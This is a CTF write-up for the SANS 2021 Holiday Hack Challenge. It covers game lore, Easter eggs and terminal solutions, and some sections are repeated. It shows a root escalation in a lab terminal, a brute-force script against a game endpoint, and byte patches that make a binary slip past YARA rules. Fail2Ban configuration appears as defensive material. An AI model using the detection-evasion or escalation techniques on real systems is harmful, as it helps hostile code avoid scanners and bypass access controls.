Had you asked me at the beginning of 2021 if I'd be submitting a write-up, I might've hesitated. But each year, as the KringleCon chatter starts to build, so does my excitement, and it just reels me right back in. So, once again, I packed a suitcase, booked a flight, and headed to the North Pole to meet up with Santa, the Elves, and all my KringleCon friends! Similar to last year, there's 3 main sections. This page which contains the introduction, answers, the overall narrative, and final conclusion. Objectives contains the write-ups for the main objectives for which an answer had to be submitted and Terminal Hints has the write-ups for the additional side challenges which provide you with hints to help solve the main objectives. As always, there's a few things worth highlighting like getting root on the IMDS Exploration terminal, bruteforcing the Frostavator, the minor mistake in Prof. Petabyte's FPGA presentation, a bit of cheating here and there , solving terminals with one-liners , the behind the scenes of the WiFi dongle , the very incomplete list of Easter eggs , and all of the custom scripts used throughout the game. 50-page submission limit Each year there's a huge number of write-ups that need to be reviewed by the SANS and Counter Hack teams. To find a good middle ground between preventing information overload and creating a write-up that can stand on its own as a learning resource, some parts, like the navigation tip below, are collapsed by default. Skipping over these will not take away from understanding the overall solution, but feel free to expand them to get some additional information. Navigation tip Even with less than 50 pages, there's still quite a bit of information to read through.

Our first expedition established a base in the land of Oz, where our researchers became known as \u201cMunchkins.\u201d We received a message from them long ago about a Great Schism, where the Frostian expedition split into two warring factions: Munchkins and Elves.

We had no idea that Jack Frost would cause such trouble! We sincerely apologize. We will take Jack back home to Planet Frost, along with all the other trolls. The Elves and Munchkins, of course, can remain if they opt to do so. Fear not, we WILL bring Jack and any guilty trolls to justice for their infractions. They will not bother your planet any longer. Again, we apologize for all the troubles he has caused, and we sincerely THANK YOU for your help! And, now that you've helped us solve everything, feel free to show off your skills with some swag - only for our victors! Jack Frost I was just having a little fun. C\u2019mon, man!

I\u2019d like to thank you for your truly excellent work in foiling Jack\u2019s plans and ensuring that he is finally brought to justice. On behalf of all of us here at the North Pole, we wish you and yours a happy and healthy Holiday Season. Thank you and HAPPY HOLIDAYS from me and all of the elves.

Ho Ho Ho!","title":"Conclusion"},{"location":"easter_eggs/","text":"Easter Eggs \u2693\ufe0e Every year my plan is to find all the Easter eggs and every year I fail miserably. It's simply amazing how many things you can find once you start looking around for them, like movie references, jokes, nods to popular culture, memes, secret areas, references to past Holiday Hack Challenge, and funny WebSocket response messages. Below, in no particular order, are just a few. Four Calling Birds \u2693\ufe0e Probably to no one's surprise, this year's event announcement continues the KringleCon title trend set by previous iterations. 2019 was named KringleCon 2: Turtle Doves , in 2020 it was KringleCon 3: French Hens , and this time around we get KringleCon 4: Calling Birds which is a reference to the fourth verse from the Twelve Days of Christmas carol. The Twelve Days Of Christmas ... On the second day of Christmas My true love gave to me: Two turtle doves ... On the third day of Christmas My true love gave to me: Three french hens ... On the forth day of Christmas My true love gave to me: Four calling birds ... The Third Kind \u2693\ufe0e The big reveal at this year's event is of course the spaceship on the roof of Frost Tower. The Third Kind map destination, the Speak & Spell music , and the sound the spaceship makes as it lands are of course direct references to Spielberg's movie Close Encounters of the Third Kind . It seemed only fitting to make this year's write-up poster a reference to that movie as well. Klatu Barada Nikto! \u2693\ufe0e There's a second science-fiction movie reference when you first talk to Numby Chilblain on the Frost Tower rooftop and he says \"Klatu Barada Nikto!\" . This is a nod to the 1951 movie The Day the Earth Stood Still . The Discworld \u2693\ufe0e If you ride the Santavator or Frostavator to a floor that does not exist you end up in an area named __Shenanigans__ . The room's backdrop is an image of the Discworld , a fictional setting for all of Terry Pratchett's Discworld fantasy novels. How to get here is explained as part of the Frostavator terminal write-up. Those darn interns! \u2693\ufe0e Using get_ssrf_data.py to retrieve /var/www/html/index.html from the Now Hiring! challenge reveals a reference to the SolarWinds supply chain attack, where an intern was blamed for the insecure solarwinds123 password. Carmen Sandiego \u2693\ufe0e The second challenge is a reference to the 1985 video game Where in the World is Carmen Sandiego . Jason... the flush handle \u2693\ufe0e Anyone who's played SANS Holiday Hack Challenge a few times before know he's always hidden somewhere in the game. This time around poor Jason gets assigned the not so glamorous role of toilet flush handle. At least it's a golden one. There's also some whimsicalness going on with some of the image assets in Jack's restroom. First, the asset name for the toilet image is terrrlet.png which, according to Urban Dictionary , is how some people pronounce toilet. Secondly, the back , left , and right walls are covered by transparent image overlays containing an assortment of signatures. Rihanna's umbrella \u2693\ufe0e Another funny asset name can be found as part of the satellite dish contraption that Crunchy Squishter created to communicate with the Frostians. The asset name of the umbrella, ellaellaeheheh.png , is a reference to the song Umbrella by Rihanna. Printer queue document \u2693\ufe0e One of the PDF documents in the printer queue is a reference to How to Win Friends and Influence People by Dale Carnegie. Painting peephole \u2693\ufe0e Last year's painting has been replaced, leaving a discolored outline on the wall. The peephole eyes are still present though! Castle artwork \u2693\ufe0e It looks like last year's artwork , which is cut from a single image, is still hanging on the walls in Santa's castle. If you download all the textures from https://2021.kringlecon.com/textures/art/f{1-39}.png , you can recreate this painting of Jack Frost. Ille te videt dum dormit \u2693\ufe0e The phrase Ille te videt dum dormit on the ElfU logo is Latin and translates to he sees you while you're sleeping . Web socket messages \u2693\ufe0e The WebSocket at wss://2021.kringlecon.com/ws is a lot of fun to play around with. The WS_OHHIMARK and DENNIS_NEDRY response message types are references to the movies The Room and Jurassic Park , respectively. WS_OHHIMARK DENNIS_NEDRY Stolen KringleCon talks \u2693\ufe0e Pat Tronizer I'm SO glad to have all these first-rate talks here. We issued a Call for Talks, but only one person responded\u2026 We put him in track 1. But Jack came up with an ingenious way to borrow additional talks for FrostFest! You can hardly tell where we got these great speakers! Jack Frost put absolutely 0 effort in creating original content which is pretty apparent when you put the KringleCon 4 and FrostFest speaker agendas side by side. The best part though is the camcorder overlay which was added to all the KringleCon talks. Portrait painting \u2693\ufe0e The portrait painting in Jack's studio was a key plot item in last year's events. It features Ed Skoudis as Santa Claus and was painted by Ed's daughter Jessica Skoudis. The initials on the portrait not only refer to Jack Frost: Santa , as per the narrative, but are in fact Jessica's initials. The items on the desk are references to past Holiday Hack Challenges .

Request \u2693\ufe0e Noxious O'Dor Hey, this is the executive restroom. Wasn't that door closed? I'm Noxious O'Dor. And I've gotta say, I think that Jack Frost is just messed up. I mean, I'm no expert, but his effort to \"win\" against Santa by going bigger and bolder seems bad. You know, I'm having some trouble with this IMDS exploration. I'm hoping you can give me some help in solving it. If you do, I'll be happy to trade you for some hints on SSRF! I've been studying up on that and have some good ideas on how to attack it! Solution \u2693\ufe0e Welcome message \ud83c\udf84\ud83c\udf84\ud83c\udf84 Prof. Petabyte here. In this lesson you'll continue to build your cloud asset skills, \ud83c\udf84\ud83c\udf84\ud83c\udf84 interacting with the Instance Metadata Service (IMDS) using curl. \ud83c\udf84\ud83c\udf84\ud83c\udf84 \ud83c\udf84\ud83c\udf84\ud83c\udf84 If you get stuck, run 'hint' for assitance. \ud83c\udf84\ud83c\udf84\ud83c\udf84 This terminal takes you through what IMDS is and how you can interact with the service by going over various sample curl commands. Instead of rehashing the same commands here and calling it a write-up, let's look at some other fun things we can do, like skipping past all the questions to get the achievement or elevating our privileges to root ! During Prof. Petabyte's lesson you're asked to type next a few times. This command actually works for every single question and so a one-liner like for i in {1..18}; do next; sleep 1; done will award you the achievement with minimal effort. Getting root Skipping past all the questions is fun, but getting a root shell is better! Start by using Ctrl + c to break out of the startup sequence. If you time it right you'll prevent the bottom pane from fully loading and end up logged in as the init user. In the user's home folder you'll find a tmuxp session configuration file (i.e., mysession.yaml ), the top_pane and bottom_pane setuid binaries that are run in each tmux pane, and a questions_answers.json file. During terminal startup there's an /etc/sudoers file present with an entry for the elfu user. However, as top_pane parses questions_answers.json and loads the data for the first question, it'll execute 2 additional commands, one being sudo rm /etc/sudoers which removes elfu 's sudo permissions again.

Instead of rehashing the same commands here and calling it a write-up, let's look at some other fun things we can do, like skipping past all the questions to get the achievement or elevating our privileges to root ! During Prof. Petabyte's lesson you're asked to type next a few times. This command actually works for every single question and so a one-liner like for i in {1..18}; do next; sleep 1; done will award you the achievement with minimal effort. Getting root Skipping past all the questions is fun, but getting a root shell is better! Start by using Ctrl + c to break out of the startup sequence. If you time it right you'll prevent the bottom pane from fully loading and end up logged in as the init user. In the user's home folder you'll find a tmuxp session configuration file (i.e., mysession.yaml ), the top_pane and bottom_pane setuid binaries that are run in each tmux pane, and a questions_answers.json file. During terminal startup there's an /etc/sudoers file present with an entry for the elfu user. However, as top_pane parses questions_answers.json and loads the data for the first question, it'll execute 2 additional commands, one being sudo rm /etc/sudoers which removes elfu 's sudo permissions again. To get a root shell, open a new tmux window using Ctrl + b c (line 2), kill the old processes (lines 3-5), take ownership of the files so we can edit them (lines 6-9), change the session name in mysession.yaml (line 10), edit questions_answers.json so it doesn't delete /etc/sudoers (line 11), and load mysession.yaml to initialize everything again (line 12).

Snrack! Pthbthbthb. Gnerphk. Well, on to business. I'm Grody Goiterson. ... It's a family name. So hey, this is the Frostavator. It runs on some logic chips... that fell out. I put them back in, but I must have mixed them up, because it isn't working now. If you don't know much about logic gates, it's something you should look up. If you help me run the elevator, maybe I can help you with something else. I'm pretty good with FPGAs, if that's worth something to ya'. Hints \u2693\ufe0e Logic Gate Iconography This Solution \u2693\ufe0e There's three ways to approach this. The first option is to ignore the elevator and just use the stairs. Option two is take the time to learn about logic gates and drag and drop the components on the Frostavator panel around until we end up with a valid solution. The final option is to bruteforce the Frostavator and compile a list of all the valid panel layouts. The first leaves us without a hint, the second is the most educational, the third however is probably the most fun! The app.js code tells us that the panel layout is stored as an Array of 6 integers ranging from 0 to 5. The code first tries to load the data from a local storage variable called frostavatorData . If that's not available, the layout defaults to [4, 3, 5, 0, 1, 2]. Each number in the list corresponds with a type of logic gate, while the number's position in the list defines its location on the panel. Each time we drag one of the ICs around and let go of the mouse button, the gateCheck() function is executed which validates the current panel layout. If everything checks out the layout is then sent via a POST request to /check . While the POST request is shielded by some validation logic in app.js , all it really requires as input is an ID and a list representation of a panel layout. We can confirm this by sending a manual POST request and capturing the response. POST request with an invalid layout POST request with a valid layout An invalid panel layout returns a result field set to false . Generating all 720 permutations of [0, 1, 2, 3, 4, 5] and sending each one to the /check endpoint for validation will at some point respond with a hash field and value, indicating that particular sequence is a valid one. Now that we know the difference between valid and invalid, we can finalize our automation. bruteforce_frostavator.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 #!/usr/bin/env python import asyncio import itertools import random from typing import Optional , Tuple import aiohttp import click import tqdm GATES = [ 'AND' , 'NAND' , 'OR' , 'NOR' , 'XOR' , 'XNOR' ] def create_ascii_board ( layout : list ): \"\"\"Print an ASCII board layout.\"\"\" g0 = f \" { GATES [ layout [ 0 ]] : ^6 } \" g1 = f \" { GATES [ layout [ 1 ]] : ^6 } \" g2 = f \" { GATES [ layout [ 2 ]] : ^6 } \" g3 = f \" { GATES [ layout [ 3 ]] : ^6 } \" g4 = f \" { GATES [ layout [ 4 ]] : ^6 } \" g5 = f \" { GATES [ layout [ 5 ]] : ^6 } \" return ( \"Logic board layout: \\n\\n \" \" +------+ +------+ +------+ \\n \" f \" | { g0 } | | { g1 } | | { g2 } | \\n \" \" +------+ +------+ +------+ \\n \" \" +------+ +------+ +------+ \\n \" f \" | { g3 } | | { g4 } | | { g5 } | \\n \" \" +------+ +------+ +------+\" ) async def fetch ( session : aiohttp .

Alternatively, we can drag and drop the ICs on the panel to match the ASCII representation provided by the --pick-one option.

The first option is to ignore the elevator and just use the stairs. Option two is take the time to learn about logic gates and drag and drop the components on the Frostavator panel around until we end up with a valid solution. The final option is to bruteforce the Frostavator and compile a list of all the valid panel layouts. The first leaves us without a hint, the second is the most educational, the third however is probably the most fun! The app.js code tells us that the panel layout is stored as an Array of 6 integers ranging from 0 to 5. The code first tries to load the data from a local storage variable called frostavatorData . If that's not available, the layout defaults to [4, 3, 5, 0, 1, 2]. Each number in the list corresponds with a type of logic gate, while the number's position in the list defines its location on the panel. Each time we drag one of the ICs around and let go of the mouse button, the gateCheck() function is executed which validates the current panel layout. If everything checks out the layout is then sent via a POST request to /check . While the POST request is shielded by some validation logic in app.js , all it really requires as input is an ID and a list representation of a panel layout. We can confirm this by sending a manual POST request and capturing the response. POST request with an invalid layout POST request with a valid layout An invalid panel layout returns a result field set to false . Generating all 720 permutations of [0, 1, 2, 3, 4, 5] and sending each one to the /check endpoint for validation will at some point respond with a hash field and value, indicating that particular sequence is a valid one. Now that we know the difference between valid and invalid, we can finalize our automation. bruteforce_frostavator.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 #!/usr/bin/env python import asyncio import itertools import random from typing import Optional , Tuple import aiohttp import click import tqdm GATES = [ 'AND' , 'NAND' , 'OR' , 'NOR' , 'XOR' , 'XNOR' ] def create_ascii_board ( layout : list ): \"\"\"Print an ASCII board layout.\"\"\" g0 = f \" { GATES [ layout [ 0 ]] : ^6 } \" g1 = f \" { GATES [ layout [ 1 ]] : ^6 } \" g2 = f \" { GATES [ layout [ 2 ]] : ^6 } \" g3 = f \" { GATES [ layout [ 3 ]] : ^6 } \" g4 = f \" { GATES [ layout [ 4 ]] : ^6 } \" g5 = f \" { GATES [ layout [ 5 ]] : ^6 } \" return ( \"Logic board layout: \\n\\n \" \" +------+ +------+ +------+ \\n \" f \" | { g0 } | | { g1 } | | { g2 } | \\n \" \" +------+ +------+ +------+ \\n \" \" +------+ +------+ +------+ \\n \" f \" | { g3 } | | { g4 } | | { g5 } | \\n \" \" +------+ +------+ +------+\" ) async def fetch ( session : aiohttp .

Noel Boetie here. We're all so glad to have you attend KringleCon IV and work on the Holiday Hack Challenge! I'm just hanging out here by the Logic Munchers game. You know... logic: that thing that seems to be in short supply at the tower on the other side of the North Pole? Oh, I'm sorry. That wasn't terribly kind, but those frosty souls do confuse me... Anyway, I'm working my way through this Logic Munchers game. A lot of it comes down to understanding boolean logic, like True And False is False , but True And True is True . It can get a tad complex in the later levels. I need some help, though. If you can show me how to complete a stage in Potpourri at the Intermediate (Stage 3) or higher, I'll give you some hints for how to find vulnerabilities. Specifically, I'll give you some tips in finding flaws in some of the web applications I've heard about here at the North Pole, especially those associated with slot machines! Hints \u2693\ufe0e Boolean Logic There are lots of special symbols for logic and set notation. This one covers AND, NOT, and OR at the bottom. AND, OR, NOT, XOR This might be a handy reference too. Solution \u2693\ufe0e To unlock the achievement we need to complete a stage in Potpourri on Intermediate or higher. We can either play the game as intended and learn about boolean logic or we can cheat. Each grid is represented by a JavaScript variable named challenges which contains both the statement shown in each cell as well as the associated true or false result. The chompy.js game code contains a checkWin() function which iterates over this challenges variable and checks if any items are still set to true (i.e., still need to be chomped) and if not, levels up the game. Start a stage in Potpourri on Intermediate or higher and paste the below JavaScript code in your web browser's console. This will set all item results in challenges to false (line 3), satisfying the checkWin() function, and level up the game. Skip to the next level 1 2 3 4 5 6 for ( var col = 0 ; col < challenges . length ; col ++ ) { for ( var cell = 0 ; cell < challenges [ col ]. length ; cell ++ ) { challenges [ col ][ cell ][ 1 ] = false ; } } checkWin () The autoplay_chompers.js script below takes this a step further by adding a timer that repeats this logic for each new level. The biggest difference with the code snippet above is that it more closely mimics a user playing the game by searching for items in challenges that are set to true and calling a chomp() function on those cells. autoplay_chompers.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // Modified chomp function that checks the cell at position (x,y) function chomp ( x , y ) { if ( challenges [ x ][ y ][ 0 ] != \"\" ) { // Clear the cell document . getElementById ( x + ',' + y ). innerHTML = \"\" ; if ( challenges [ x ][ y ][ 1 ]) { // Update the score score += 100 ; document . getElementById ( \"score\" ). innerHTML = \"<h2>\" + score + \"</h2>\" ; } else { // Leave this in as a sanity check wigwags ( \"Oh no! Ate a wrong answer!\" ) } } challenges [ x ][ y ] = [[],[]]; checkWin (); } // Play the level by chomping each cell containing a true statement function playLevel () { for ( var col = 0 ; col < challenges . length ; col ++ ) { for ( var cell = 0 ; cell < challenges [ col ]. length ; cell ++ ) { if ( challenges [ col ][ cell ][ 1 ] == true ) { chomp ( col , cell );} } } } // Call playLevel() every 2 seconds setInterval ( playLevel , 2000 ); The chomp() function will verify that the cell's result is in fact true and run through the game mechanics like updating the score, clearing out the cell, and calling checkWin() to level up the game. To use the script, start a new game, paste the contents of autoplay_chompers.js in your web browser's console, sit back, and enjoy the show. Response \u2693\ufe0e Noel Boetie Wow - amazing score!

You know... logic: that thing that seems to be in short supply at the tower on the other side of the North Pole? Oh, I'm sorry. That wasn't terribly kind, but those frosty souls do confuse me... Anyway, I'm working my way through this Logic Munchers game. A lot of it comes down to understanding boolean logic, like True And False is False , but True And True is True . It can get a tad complex in the later levels. I need some help, though. If you can show me how to complete a stage in Potpourri at the Intermediate (Stage 3) or higher, I'll give you some hints for how to find vulnerabilities. Specifically, I'll give you some tips in finding flaws in some of the web applications I've heard about here at the North Pole, especially those associated with slot machines!","title":"Request"},{"location":"hints/h4/#hints","text":"Boolean Logic There are lots of special symbols for logic and set notation.

We can either play the game as intended and learn about boolean logic or we can cheat. Each grid is represented by a JavaScript variable named challenges which contains both the statement shown in each cell as well as the associated true or false result. The chompy.js game code contains a checkWin() function which iterates over this challenges variable and checks if any items are still set to true (i.e., still need to be chomped) and if not, levels up the game. Start a stage in Potpourri on Intermediate or higher and paste the below JavaScript code in your web browser's console. This will set all item results in challenges to false (line 3), satisfying the checkWin() function, and level up the game. Skip to the next level 1 2 3 4 5 6 for ( var col = 0 ; col < challenges . length ; col ++ ) { for ( var cell = 0 ; cell < challenges [ col ]. length ; cell ++ ) { challenges [ col ][ cell ][ 1 ] = false ; } } checkWin () The autoplay_chompers.js script below takes this a step further by adding a timer that repeats this logic for each new level. The biggest difference with the code snippet above is that it more closely mimics a user playing the game by searching for items in challenges that are set to true and calling a chomp() function on those cells. autoplay_chompers.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // Modified chomp function that checks the cell at position (x,y) function chomp ( x , y ) { if ( challenges [ x ][ y ][ 0 ] != \"\" ) { // Clear the cell document . getElementById ( x + ',' + y ). innerHTML = \"\" ; if ( challenges [ x ][ y ][ 1 ]) { // Update the score score += 100 ; document . getElementById ( \"score\" ). innerHTML = \"<h2>\" + score + \"</h2>\" ; } else { // Leave this in as a sanity check wigwags ( \"Oh no! Ate a wrong answer!\" ) } } challenges [ x ][ y ] = [[],[]]; checkWin (); } // Play the level by chomping each cell containing a true statement function playLevel () { for ( var col = 0 ; col < challenges . length ; col ++ ) { for ( var cell = 0 ; cell < challenges [ col ]. length ; cell ++ ) { if ( challenges [ col ][ cell ][ 1 ] == true ) { chomp ( col , cell );} } } } // Call playLevel() every 2 seconds setInterval ( playLevel , 2000 ); The chomp() function will verify that the cell's result is in fact true and run through the game mechanics like updating the score, clearing out the cell, and calling checkWin() to level up the game. To use the script, start a new game, paste the contents of autoplay_chompers.js in your web browser's console, sit back, and enjoy the show.","title":"Solution"},{"location":"hints/h4/#response","text":"Noel Boetie Wow - amazing score!

Solution \u2693\ufe0e Welcome message Jack is trying to break into Santa's workshop! Santa's elves are working 24/7 to manually look through logs, identify the malicious IP addresses, and block them. We need your help to automate this so the elves can get back to making presents! Can you configure Fail2Ban to detect and block the bad IPs? * You must monitor for new log entries in /var/log/hohono.log * If an IP generates 10 or more failure messages within an hour then it must be added to the naughty list by running naughtylist add <ip> /root/naughtylist add 12.34.56.78 * You can also remove an IP with naughtylist del <ip> /root/naughtylist del 12.34.56.78 * You can check which IPs are currently on the naughty list by running /root/naughtylist list You'll be rewarded if you correctly identify all the malicious IPs with a Fail2Ban filter in /etc/fail2ban/filter.d, an action to ban and unban in /etc/fail2ban/action.d, and a custom jail in /etc/fail2ban/jail.d. Don't add any nice IPs to the naughty list! *** IMPORTANT NOTE! *** Fail2Ban won't rescan any logs it has already seen. That means it won't automatically process the log file each time you make changes to the Fail2Ban config. When needed, run /root/naughtylist refresh to re-sample the log file and tell Fail2Ban to reprocess it. Introduction \u2693\ufe0e Andy Smith's KringleCon talk provides a great introduction to Fail2Ban and goes over all the steps required to set up your own custom configuration. In short, there's 3 config files we need to create: a filter, an action, and a jail which ties it all together. Log analysis \u2693\ufe0e Before we start diving into config files though, we first need to analyze /var/log/hohono.log to understand what bad activity actually looks like. Lines containing Valid , successfully , and successful are obviously good and should be ignored. By filtering out the valid log entries using grep -v 'successful\\|Valid' we're left with 4 distinct types of failure messages. Filter configuration \u2693\ufe0e Now that we know what each failure message looks like we can configure Fail2Ban, starting with the /etc/fail2ban/filter.d/hohono.conf filter. This configuration file contains a series of regular expressions matching every possible failure message and uses placeholders like <HOST> to identify and extract the IP address responsible for the activity. /etc/fail2ban/filter.d/hohono.conf 1 2 3 4 5 [ Definition ] failregex = <HOST> sent a malformed request Login from <HOST> rejected due to unknown user name Failed login from <HOST> for .* Invalid heartbeat .* from <HOST> Running fail2ban-regex /var/log/hohono.log /etc/fail2ban/filter.d/hohono.conf validates our custom filter definition. Action configuration \u2693\ufe0e Next we create the /etc/fail2ban/action.d/hohono.conf action which instructs Fail2Ban what commands should be run to ban (line 2) and unban (line 3) an IP address. Just like we used <HOST> to identify and extract the IP address in the filter, we can use <ip> to automatically pass the correct IP address to the naughtylist command. /etc/fail2ban/action.d/hohono.conf 1 2 3 [ Definition ] actionban = /root/naughtylist add <ip> actionunban = /root/naughtylist del <ip> Jail configuration \u2693\ufe0e The final step to setting up Fail2Ban for our use case is to create an /etc/fail2ban/jail.d/hohono.conf jail which ties together our filter (line 3), action (line 4), /var/log/hohono.log (line 5), and a 10 failures per hour threshold (lines 7-8). /etc/fail2ban/jail.d/hohono.conf 1 2 3 4 5 6 7 8 [ hohono ] enabled = true filter = hohono action = hohono logpath = /var/log/hohono.log bantime = 86400 # 1 day (in seconds) findtime = 3600 # 1 hour (in seconds) maxretry = 10 Bring down the ban hammer! \u2693\ufe0e All the required configuration pieces are now in place. Restart the fail2Ban service using either /etc/init.d/fail2ban restart or service fail2ban restart and check that the hohono jail has been loaded by running fail2ban-client status hohono . The final step is to use /root/naughtylist refresh to force Fail2Ban to rescan the /var/log/hohono.log log file. Response \u2693\ufe0e Eve Snowshoes Fantastic! Thanks for the help!

And, I'll tell you what \u2013 if you help me with YARA, I'll give you some tips for Splunk! I think if you make small, innocuous changes to the executable, you can get it to run in spite of the YARA rules. Solution \u2693\ufe0e Welcome message HELP!!! This critical application is supposed to tell us the sweetness levels of our candy manufacturing output (among other important things), but I can't get it to run. It keeps saying something something yara. Can you take a look and see if you can help get this application to bypass Sparkle Redberry's Yara scanner? If we can identify the rule that is triggering, we might be able change the program to bypass the scanner. We have some tools on the system that might help us get this application going: vim, emacs, nano, yara, and xxd The children will be very disappointed if their candy won't even cause a single cavity. For a one-liner solution, scroll all the way down to the bottom. The goal of this challenge is to modify the the_critical_elf_app binary in such a way that it doesn't trigger any of the YARA rules anymore. Each rule consists of a series of strings and a boolean expression that represents the condition that needs to be met for the rule to match. Start by running ./the_critical_elf_app which prints the message yara_rule_135 ./the_critical_elf_app . We can look up the specifics for this YARA rule in ~/yara_rules/rules.yar . yara_rule_135 1 2 3 4 5 6 7 8 9 10 11 12 rule yara_rule_135 { meta: description = \"binaries - file Sugar_in_the_machinery\" author = \"Sparkle Redberry\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-21\" hash = \"19ecaadb2159b566c39c999b0f860b4d8fc2824eb648e275f57a6dbceaf9b488\" strings: $s = \"candycane\" condition: $s } The rule matches because somewhere in the binary there's a candycane string. Create a hex dump of the binary using xxd the_critical_elf_app > the_critical_elf_app.hex and open the file in your favorite editor. Search for candy to find the offending string and change the hex value of one of the letters so the YARA rule doesn't match anymore. In the below example changing 0x61 to 0x40 updates the string to c@ndycane . An ASCII table can help with the ASCII to hex conversion. Updated hex dump Original hex dump Convert the hex dump back to a binary with xxd -r the_critical_elf_app.hex the_critical_elf_app_1 and make it executable using chmod +x the_critical_elf_app_1 . Running the updated binary now triggers yara_rule_1056 . yara_rule_1056 1 2 3 4 5 6 7 8 9 10 11 12 13 rule yara_rule_1056 { meta: description = \"binaries - file frosty.exe\" author = \"Sparkle Redberry\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-21\" hash = \"b9b95f671e3d54318b3fd4db1ba3b813325fcef462070da163193d7acb5fcd03\" strings: $s1 = {6c 6962 632e 736f 2e36} $hs2 = {726f 6772 616d 2121} condition: all of them } This time the rule has 2 conditions which both need to match. Open the modified hex dump again and search for both hex strings to determine which one we can safely modify. If a search doesn't find the string you're looking for, trim it down as it might span across multiple lines. {6c 6962 632e 736f 2e36} can't be changed as libc.so.6 is an essential library. {726f 6772 616d 2121} however is fine, regardless of what the ASCII string states. Let's change 0x6f to 0x30 , so we get pr0gram!! .

One-liner solution To solve this with a one-liner we'll modify the data at uint32(1) instead of increasing the file size. uint32() reads data as little-endian integers, so we need to invert 0x02464c45 to 0x454c4602 to match the data at byte offset 1. This byte sequence is part of what identifies a 64-bit ELF binary and typically shouldn't be tampered with. In this case however, changing the last byte with value 0x02 to a non-supported class (e.g., 0x03 ) still allows the binary to execute. Each step now edits a series of hex values, meaning we can leverage sed to make those changes on the fly. Below is the one-liner command, split across multiple lines for readability. The final sudo step is required because of how the challenge is set up. Our Bash shell has a pre-execution hook, loaded through /usr/local/bin/.bash-preexec.sh which sends our command to sudo -E /usr/local/bin/pre_execution.sh $1; so it's checked against the YARA rules. 1 2 3 4 5 xxd the_critical_elf_app | \\ sed 's/6361 6e64 7963/6340 6e64 7963/g; s/726f 6772 616d 2121/7230 6772 616d 2121/g; s/7f45 4c46 02/7f45 4c46 03/g' | \\ xxd -r > the_critical_elf_app_fixed && \\ chmod +x the_critical_elf_app_fixed && \\ sudo -E /usr/local/bin/pre_execution.sh ./the_critical_elf_app_fixed Response \u2693\ufe0e Fitzy Shortstack Thanks - you figured it out! Let me tell you what I know about Splunk. Did you know Splunk recently added support for new data sources including Sysmon for Linux and GitHub Audit Log data? Between GitHub audit log and webhook event recording, you can monitor all activity in a repository, including common git commands such as git add , git status , and git commit . You can also see cloned GitHub projects. There's a lot of interesting stuff out there. Did you know there are repositories of code that are Darn Vulnerable? Sysmon provides a lot of valuable data, but sometimes correlation across data types is still necessary. Sysmon network events don't reveal the process parent ID for example. Fortunately, we can pivot with a query to investigate process creation events once you get a process ID. Sometimes Sysmon data collection is awkward. Pipelining multiple commands generates multiple Sysmon events, for example. Did you know there are multiple versions of the Netcat command that can be used maliciously? nc.openbsd , for example.","title":"Yara Analysis"},{"location":"hints/h9/#yara-analysis","text":"Elf : Fitzy Shortstack Direct link : yara terminal Objective : Splunk!","title":"Yara Analysis"},{"location":"hints/h9/#request","text":"Fitzy Shortstack Hiya, I'm Fitzy Shortstack!

This critical application is supposed to tell us the sweetness levels of our candy manufacturing output (among other important things), but I can't get it to run. It keeps saying something something yara. Can you take a look and see if you can help get this application to bypass Sparkle Redberry's Yara scanner? If we can identify the rule that is triggering, we might be able change the program to bypass the scanner. We have some tools on the system that might help us get this application going: vim, emacs, nano, yara, and xxd The children will be very disappointed if their candy won't even cause a single cavity. For a one-liner solution, scroll all the way down to the bottom. The goal of this challenge is to modify the the_critical_elf_app binary in such a way that it doesn't trigger any of the YARA rules anymore. Each rule consists of a series of strings and a boolean expression that represents the condition that needs to be met for the rule to match. Start by running ./the_critical_elf_app which prints the message yara_rule_135 ./the_critical_elf_app . We can look up the specifics for this YARA rule in ~/yara_rules/rules.yar . yara_rule_135 1 2 3 4 5 6 7 8 9 10 11 12 rule yara_rule_135 { meta: description = \"binaries - file Sugar_in_the_machinery\" author = \"Sparkle Redberry\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-21\" hash = \"19ecaadb2159b566c39c999b0f860b4d8fc2824eb648e275f57a6dbceaf9b488\" strings: $s = \"candycane\" condition: $s } The rule matches because somewhere in the binary there's a candycane string. Create a hex dump of the binary using xxd the_critical_elf_app > the_critical_elf_app.hex and open the file in your favorite editor. Search for candy to find the offending string and change the hex value of one of the letters so the YARA rule doesn't match anymore. In the below example changing 0x61 to 0x40 updates the string to c@ndycane . An ASCII table can help with the ASCII to hex conversion. Updated hex dump Original hex dump Convert the hex dump back to a binary with xxd -r the_critical_elf_app.hex the_critical_elf_app_1 and make it executable using chmod +x the_critical_elf_app_1 . Running the updated binary now triggers yara_rule_1056 . yara_rule_1056 1 2 3 4 5 6 7 8 9 10 11 12 13 rule yara_rule_1056 { meta: description = \"binaries - file frosty.exe\" author = \"Sparkle Redberry\" reference = \"North Pole Malware Research Lab\" date = \"1955-04-21\" hash = \"b9b95f671e3d54318b3fd4db1ba3b813325fcef462070da163193d7acb5fcd03\" strings: $s1 = {6c 6962 632e 736f 2e36} $hs2 = {726f 6772 616d 2121} condition: all of them } This time the rule has 2 conditions which both need to match. Open the modified hex dump again and search for both hex strings to determine which one we can safely modify. If a search doesn't find the string you're looking for, trim it down as it might span across multiple lines. {6c 6962 632e 736f 2e36} can't be changed as libc.so.6 is an essential library. {726f 6772 616d 2121} however is fine, regardless of what the ASCII string states.

